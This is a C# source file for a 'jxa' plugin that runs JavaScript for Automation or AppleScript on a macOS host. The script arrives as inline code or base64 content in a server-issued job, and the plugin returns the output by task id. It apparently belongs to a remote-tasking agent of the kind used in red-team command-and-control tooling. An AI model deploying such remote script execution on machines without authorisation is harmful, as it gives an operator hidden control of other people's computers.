using Workflow.Contracts;
using Workflow.Models;
using System.Runtime.InteropServices;
using System.Text;
using OSXIntegration.Framework;
using Workflow.Framework;
using System.Text.Json;
using jxa;
using System.Text.Json.Serialization;
using Workflow.Utilities;
namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "jxa";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            JxaArgs args = JsonSerializer.Deserialize<JxaArgs>(job.task.parameters);
            try
            {
                if (!string.IsNullOrEmpty(args.code))
                {
                    DebugLog.Log($"{Name} running inline code [{job.task.id}]");
                    messageManager.WriteLine(AppleScript.Run(args.code), job.task.id, true);
                }
                else if (!string.IsNullOrEmpty(args.scriptcontents))
                {
                    DebugLog.Log($"{Name} running script from file [{job.task.id}]");
                    messageManager.WriteLine(AppleScript.Run(Misc.Base64DecodeToByteArray(args.scriptcontents)), job.task.id, true);
                }
                else
                {
                    DebugLog.Log($"{Name} no script provided [{job.task.id}]");
                    messageManager.WriteLine("No valid scripts provided", job.task.id, true);
                }
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} exception: {e.Message} [{job.task.id}]");
                messageManager.WriteLine(e.ToString(), job.task.id, true);
            }
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
    }
}
